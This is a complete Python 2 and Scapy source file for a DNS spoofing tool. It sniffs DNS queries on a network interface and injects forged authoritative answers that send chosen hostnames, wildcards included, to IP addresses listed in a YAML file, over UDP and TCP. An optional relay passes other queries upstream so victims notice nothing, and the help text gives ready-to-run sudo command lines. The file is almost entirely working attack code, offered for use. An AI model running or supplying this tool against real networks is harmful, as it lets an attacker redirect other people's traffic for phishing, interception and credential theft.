#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
# dns.py -- DNS spoof / relay for Python-2.7 + Scapy-2.4.5
# This script intercepts DNS queries on an interface, spoofs answers for
# matched hostnames according to a YAML mapping, and optionally relays
# unmatched queries to an upstream resolver.


from __future__ import print_function, absolute_import

import argparse
import ipaddress         
import logging
import os
import signal
import socket
import sys
import threading
import time
import yaml

from scapy.all import (
    DNS, DNSQR, DNSRR,
    IP, IPv6,
    UDP, TCP,
    send, sniff,
)

def _u(s):
    try:
        return unicode(s)            
    except NameError:                    
        return s
#configure root logger: DEBUG if verbose, ERROR if quiet,else INFO (default).
def setup_logging(verbose, quiet):
    if verbose and quiet:
        quiet = False
    lvl = logging.DEBUG if verbose else (logging.ERROR if quiet else logging.INFO)
    logging.basicConfig(
        level=lvl,
        format='%(asctime)s %(levelname).1s: %(message)s',
        datefmt='%H:%M:%S',
    )
#Lower-case, strip trailing dot, always unicode.
def _normalise_qname(name):
    return _u(name).rstrip(u'.').lower()

#Thread handling DNS spoofing over both UDP and TCP.
class DNSSpoofer(threading.Thread):

    def __init__(self, iface, mapping, upstream='8.8.8.8',
                 relay=False, ttl=300, bpf=None):
        threading.Thread.__init__(self)
        self.daemon    = True
        self.iface     = iface #interface to sniff/inject
        self.mapping   = mapping #host->IP or host->list[IP]
        self.upstream  = upstream #relay target for misses
        self.relay     = relay #whether to relay unmatched
        self.ttl       = ttl #TTL for forged answers
        self.bpf       = bpf or 'udp or tcp port 53' #base BPF filter

        self._running  = threading.Event()
        self._running.set()
        self._tcp_thr  = None

    #maping lookup & response crafting helpers
    def _lookup(self, qname):
        qname = _normalise_qname(qname)

        if qname in self.mapping:
            val = self.mapping[qname]
            return val if isinstance(val, list) else [val]

        #wildcard supports: *.example.com
        it = self.mapping.iteritems() if hasattr(self.mapping, 'iteritems') else self.mapping.items()
        for pattern, val in it:
            if pattern.startswith(u'*.') and qname.endswith(pattern[2:]):
                return val if isinstance(val, list) else [val]
        return None
    
    #generate a linked DNSRR chain for all IPs to include in answer
    def _build_answers(self, qname, ips, qtype):
        answers = None
        for ip in ips:
            rr = DNSRR(rrname=qname, type=qtype, ttl=self.ttl, rdata=str(ip))
            answers = rr if answers is None else answers / rr
        return answers
    
    #construct a spoofed DNS response packet matching the query.
    def _forge_response(self, pkt, ips):
        q      = pkt[DNSQR]
        answer = self._build_answers(q.qname, ips, q.qtype)
        dns    = DNS(id=pkt[DNS].id, qr=1, aa=1,
                     qd=q, ancount=len(ips), an=answer)
        #swap src/dst for IP or IPv6
        ip_l   = IP(src=pkt[IP].dst, dst=pkt[IP].src) if IP in pkt else \
                 IPv6(src=pkt[IPv6].dst, dst=pkt[IPv6].src)
         #wrap in UDP or TCP
        if UDP in pkt:
            udp = UDP(sport=53, dport=pkt[UDP].sport)
            return ip_l / udp / dns
        else:
            tcp = TCP(sport=53, dport=pkt[TCP].sport,
                      flags='PA',
                      seq=pkt[TCP].ack,
                      ack=pkt[TCP].seq + len(pkt[TCP].payload))
            return ip_l / tcp / dns

    #Packet procesing:intercept queries & reply or relay
    def _process_udp(self, pkt):
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
            return
        qname = pkt[DNSQR].qname.decode()
        ips   = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
            logging.info('Spoofed %s -> %s', qname, ', '.join(ips))
        elif self.relay:
            self._relay_upstream(pkt)

    def _process_tcp(self, pkt):
        if not pkt.haslayer(DNS) or pkt[DNS].qr != 0:
            return
        qname = pkt[DNSQR].qname.decode()
        ips   = self._lookup(qname)
        if ips:
            send(self._forge_response(pkt, ips), iface=self.iface, verbose=0)
            logging.info('(TCP) Spoofed %s -> %s', qname, ', '.join(ips))
        elif self.relay:
            self._relay_upstream(pkt)

    #Upstream relay for unmatched queries(UDP-only)
    def _relay_upstream(self, pkt):
        qname = pkt[DNSQR].qname.decode()
        sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        try:
            sock.sendto(bytes(pkt[DNS]), (self.upstream, 53))
            data, _ = sock.recvfrom(4096)
        except socket.timeout:
            logging.warning('Upstream timeout for %s', qname)
            return
        finally:
            sock.close()
        #wrap reply in correct IP/UDP
        ip_l   = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp_l  = UDP(sport=53, dport=pkt[UDP].sport)
        send(ip_l / udp_l / DNS(data), iface=self.iface, verbose=0)

     #thread lifecycle:start TCP sniffer thread, run UDP sniffer here
    def run(self):
        logging.info('DNS spoofing on %s  (relay=%s)  filter="%s"',
                     self.iface, self.relay, self.bpf)

        #TCP snifer
        self._tcp_thr = threading.Thread(
            target=lambda: sniff(
                iface=self.iface,
                filter='tcp and (%s)' % self.bpf,
                prn=self._process_tcp,
                store=0,
                stop_filter=lambda *_: not self._running.is_set(),
            ))
        self._tcp_thr.daemon = True
        self._tcp_thr.start()

        #run UDP sniffer in this thread
        sniff(iface=self.iface,
              filter='udp and (%s)' % self.bpf,
              prn=self._process_udp,
              store=0,
              stop_filter=lambda *_: not self._running.is_set())

    def stop(self):
        self._running.clear()
        if self._tcp_thr and self._tcp_thr.is_alive():
            self._tcp_thr.join(0.5)

#YAML mapping loader: host->IP or host->list[IP]
def load_mapping(path):
    raw = yaml.safe_load(open(path, 'rb'))
    if not isinstance(raw, dict):
        raise ValueError('YAML must be a host→IP dictionary')

    mapping = {}
    it = raw.iteritems() if hasattr(raw, 'iteritems') else raw.items()
    for host, value in it:
        host_norm = _normalise_qname(host)
        ips_raw   = value if isinstance(value, list) else [value]

        good = []
        for ip in ips_raw:
            try:
                ipaddress.ip_address(_u(ip))# ipaddress needs unicode in Py-2
                good.append(str(ip))
            except ValueError:
                logging.warning('Ignoring invalid IP "%s" (host %s)', ip, host_norm)
        if good:
            mapping[host_norm] = good if len(good) > 1 else good[0]
    return mapping

def main(argv=None):
    import argparse

    parser = argparse.ArgumentParser(
        prog='dns.py',
        formatter_class=argparse.RawTextHelpFormatter,  # ← keep \n as-is
        description=(
            "DNS spoof / selective relay for Python-2.7 + Scapy 2.4.x\n"
            "Works over UDP *and* TCP, IPv4/IPv6.  Requires root privileges."
        ),
        epilog="""\
MODES
  • Pure spoof  : omit --relay  → unmatched queries are simply dropped
  • Relay mode  : add  --relay  → unmatched queries are forwarded upstream

EXAMPLES
  # 1) Classic spoof + relay so browsing does not break
  sudo python2 dns.py -i eth0 -m spoof.yml --relay -v

  # 2) Quiet spoof, custom TTL
  sudo python2 dns.py -i wlan0 -m demo.yml --ttl 60 -q

  # 3) Run only on DNS traffic of a captive portal subnet
  sudo python2 dns.py -i eth0 -m corp.yml --bpf "udp and net 10.66.0.0/16"
"""
    )

    # required
    parser.add_argument(
        "-i", "--iface", required=True,
        metavar="IFACE",
        help="Network interface to sniff/inject on (e.g. eth0)"
    )
    parser.add_argument(
        "-m", "--map", required=True,
        metavar="FILE",
        help="YAML file mapping hostnames (or wildcards) to spoofed IPs"
    )

    # operation flags
    parser.add_argument(
        "--relay", action="store_true",
        help="Forward *unmatched* queries to --upstream and return the reply"
    )
    parser.add_argument(
        "--upstream", default="8.8.8.8",
        metavar="IP",
        help="Upstream resolver used when --relay is active (default: 8.8.8.8)"
    )
    parser.add_argument(
        "--ttl", type=int, default=300,
        metavar="SECS",
        help="TTL to set on forged answers (default: 300)"
    )
    parser.add_argument(
        "--bpf", metavar="FILTER",
        help="Extra BPF filter to AND with 'port 53' "
             "(ex: --bpf \"udp and net 192.168.1.0/24\")"
    )


    vq = parser.add_mutually_exclusive_group()
    vq.add_argument("-v", "--verbose", action="store_true", help="Debug output")
    vq.add_argument("-q", "--quiet",   action="store_true", help="Errors only")

    args = parser.parse_args(argv)
    setup_logging(args.verbose, args.quiet)

    try:
        mapping = load_mapping(args.map)
    except Exception as exc:
        logging.error('%s', exc)
        sys.exit(1)

    if not mapping:
        logging.error('No valid host→IP mappings found – aborting')
        sys.exit(1)

    spoofer = DNSSpoofer(
        args.iface, mapping,
        upstream=args.upstream,
        relay=args.relay,
        ttl=args.ttl,
        bpf=args.bpf
    )
    spoofer.start()

    def _sigint(_sig, _frm):
        logging.info('Ctrl-C received – shutting down')
        spoofer.stop()
    signal.signal(signal.SIGINT, _sigint)

    while spoofer.is_alive():
        time.sleep(0.3)
    logging.info('Bye!')

if __name__ == '__main__':
    main()